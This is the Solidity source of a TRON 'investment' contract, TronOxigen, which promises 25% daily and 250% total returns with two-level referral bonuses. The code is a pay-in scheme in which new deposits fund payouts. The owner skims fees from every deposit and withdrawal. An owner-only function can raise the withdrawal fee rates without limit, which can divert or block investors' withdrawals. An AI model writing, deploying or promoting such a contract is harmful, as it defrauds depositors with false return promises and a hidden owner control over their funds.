//SourceUnit: tronoxigen.sol

/*
TronOxigen.com 

Source ver 1.0

6% Referral Commission in 2 Levels - 1% CASH BACK FOR REGISTERING WITH A REFERRAL LINK

25% daily, total return 250%

20% of each withdrawal will be sent to the balance of the contract (it is not reinvestment)
This gives greater sustainability to the contract and TronOxigen

*/

pragma solidity 0.5.9;

contract TronOxigen {
    struct Tarif {
        uint8 life_days;
        uint16 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40  last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        uint256 deposits_count;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;
	uint256 private percent_bono_a;
	uint256 private percent_bono_p;

    uint256 public invested;
	uint256 public investors;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    
    uint8[] public ref_bonuses; 

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;

        tarifs.push(Tarif(10, 250));
               
        ref_bonuses.push(4);
        ref_bonuses.push(2);
     
	  
	  percent_bono_a = 5;
	  percent_bono_p = 15;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }
  
    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus += _amount * 1 / 100;
                direct_bonus += _amount * 1 / 100;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount * 1 / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 5e7, "Zero amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        if (player.total_invested == 0) {
            investors++;
        }

        player.deposits_count++;
        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);
        
        owner.transfer((msg.value * 5) / 100);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        uint256 amount_a = (amount * percent_bono_a) / 100;
		uint256 amount_p = (amount * percent_bono_p) / 100;
		uint256 amount_player = amount - amount_a - amount_p;
		
		owner.transfer(amount_a);
		msg.sender.transfer(amount_player);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function getInvestmentsPlayer(uint index) view external returns (uint8 tarif, uint256 amount, uint40 time) {
        Player storage player = players[msg.sender];
        
        require(player.total_invested != 0, "No investments found");

        return (
            player.deposits[index].tarif,
            player.deposits[index].amount,
            player.deposits[index].time
        );
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure, uint256 deposits_count) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure, player.deposits_count
        );
    }
    
    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
	
	function setPercentageFee(uint8 _type, uint256 value) external {
		require(msg.sender == owner, "No owner");
		
		if (_type == 1) {
			percent_bono_a = value;
		}
		if (_type == 2) {
			percent_bono_p = value;
		}

	}
	
	
}